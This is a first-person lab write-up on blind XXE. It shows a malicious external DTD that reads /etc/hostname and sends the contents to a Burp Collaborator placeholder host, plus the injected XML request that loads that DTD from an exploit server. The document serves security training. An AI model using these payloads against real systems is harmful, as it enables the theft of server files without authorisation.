## Lab 05: Exploiting Blind XXE to Exfiltrate Data Using a Malicious External DTD
 
### Context
 
Confirming blind XXE exists is one thing. Actually getting data out is harder because you cannot see the resolved entity value. The solution is to use an external DTD hosted on a server you control. The DTD reads a local file, then constructs an outbound URL containing the file contents, and makes the parser fetch that URL. You receive the file contents embedded in an HTTP request to Burp Collaborator.
 
This requires two external servers: one to host the malicious DTD and one to receive the exfiltrated data. The exploit server provided by the lab handles the first, Burp Collaborator handles the second.
 
### What I Did
 
Generated a Collaborator payload. On the exploit server I created a DTD file with the following content:
 
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-COLLABORATOR.burpcollaborator.net/?x=%file;'>">
%eval;
%exfil;
```
 
This DTD reads `/etc/hostname` into the `%file` entity, constructs a second entity `%exfil` that makes an HTTP request to Collaborator with the file contents as a query parameter, then triggers both.
 
Saved the DTD on the exploit server and noted its public URL. Went back to the stock check request in Repeater and modified the XML:
 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://EXPLOIT-SERVER/malicious.dtd"> %xxe; ]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```
 
Sent the request. Polled Collaborator. An HTTP request arrived with the hostname value in the query string.
 
### Why It Works
 
The parser fetched the external DTD from my exploit server. Inside that DTD the `%eval` entity dynamically constructed a new entity referencing Collaborator with the file contents embedded in the URL. The `%exfil` entity then fired that request. Because I controlled the DTD I could chain multiple entity definitions together to build arbitrary logic inside the parser's DTD processing phase. The file contents left the server in an HTTP request to a domain I was watching.
 
